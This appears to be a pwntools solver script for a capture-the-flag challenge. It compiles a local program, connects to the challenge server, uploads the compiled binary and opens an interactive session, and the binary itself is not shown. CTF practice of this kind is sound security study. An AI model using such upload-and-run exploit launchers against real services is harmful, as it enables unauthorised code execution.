from pwn import *
import os

p = remote("baby-writeonly-password-manager-2.pwn2win.party", 1337)

if os.system("make main") == 0:
  print("compiled")

  with open("./main") as f:
    data = f.read()

  print(str(len(data)))
  p.sendlineafter("how many bytes", str(len(data)))
  p.sendafter("em!", data)

  p.interactive()
